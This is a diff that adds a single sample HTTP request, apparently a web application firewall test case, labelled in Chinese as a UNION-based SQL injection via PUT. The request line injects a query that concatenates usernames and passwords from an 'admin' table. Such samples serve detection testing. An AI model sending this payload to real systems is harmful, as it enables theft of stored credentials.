@@ -1,0 +1,9 @@
+# SQL注入_PUT_mysql_普通注入
+# 攻击者基于UNION查询，将"union select concat(username,password) from admin"语句注入到 SQL 查询参数中，目的是获取当前表下任意列的数据。通过获取当前表下任意列的数据，从而进一步进行攻击。
+PUT /id=-1 union select concat(username,password) from admin?acid=80050318&bid=hd_tag_m8mv24as HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24as
+RM-PRO-Token: 4e259e34bc7cc822896129f4a0209991
+RM-PRO-Time: 1742808372169
+User-Agent: curl/7.83.1
+
